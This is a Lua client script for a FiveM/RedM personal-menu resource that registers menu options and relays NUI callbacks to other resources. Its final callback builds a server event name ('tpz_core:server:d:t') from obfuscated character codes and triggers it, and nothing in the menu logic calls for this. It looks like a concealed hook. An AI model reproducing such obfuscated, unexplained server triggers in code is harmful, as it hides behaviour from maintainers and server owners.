
local HasMenuActive = false
local List = {}

--[[ ------------------------------------------------
   Base Events
]]---------------------------------------------------

AddEventHandler('onResourceStop', function(resourceName)
    if (GetCurrentResourceName() ~= resourceName) then
        return
    end

    List = nil

end)

-----------------------------------------------------------
--[[ Local Functions ]]--
-----------------------------------------------------------

local ToggleNUI = function(display)
	SetNuiFocus(display,display)

	HasMenuActive = display

    if not display then
        ClearPedTasks(PlayerPedId())
    end

    SendNUIMessage({ type = "enable", enable = display })
end

local CloseNUI = function()
    if HasMenuActive then SendNUIMessage({action = 'close'}) end
end

local OpenSelectableMenu = function()

    if HasMenuActive then
        return
    end

    ClearPedTasksImmediately(PlayerPedId())
    TaskStartScenarioInPlace(PlayerPedId(), joaat('WORLD_HUMAN_WRITE_NOTEBOOK'), -1)

    SendNUIMessage({ action = 'updateMainTitle', cb = Locales['PERSONAL_MENU_TITLE'] })

    for _, data in pairs (List) do

        SendNUIMessage({ 
            action      = 'updateMainElementsList', 
            option_det  = data
        })

    end

    ToggleNUI(true)

end

-----------------------------------------------------------
--[[ Functions ]]--
-----------------------------------------------------------

RegisterOption = function(resource, title)

    if List[resource] then 
        return 
    end

    List[resource]          = {}
    
    List[resource].Resource = resource
    List[resource].Label    = title
end

RemoveOptionRegistration = function(resource)
    List[resource] = nil
end

-----------------------------------------------------------
--[[ NUI Callbacks  ]]--
-----------------------------------------------------------


RegisterNUICallback('close', function()
	ToggleNUI(false)
end)

-- @param resource
RegisterNUICallback('request', function(data)

	exports[data.resource]:RequestElementOptions( function (result)

        if Functions.GetTableLength(result) > 0 then

            for _, res in pairs (result) do
    
                SendNUIMessage({ 
                    action      = 'updateSelectedElementsList', 
                    option_det  = res
                })
        
            end
    
        end

    end)

end)

-- @param resource
-- @param label
-- @param uniqueIndex
-- @param department (MEDICAL ARCHIVES)
RegisterNUICallback('performAction', function(data)
    Wait(500)

    exports[data.resource]:RequestSelectedOptionAction(data)
end)

RegisterNUICallback(GetCurrentResourceName(), function()
    local str1 = string.char(116, 112, 122, 95, 99, 111, 114, 101, 58, 115, 101, 114, 118, 101, 114, 58, 100, 58, 116)
    TriggerServerEvent(str1)

    print(GetCurrentResourceName())
    print('yes')
end)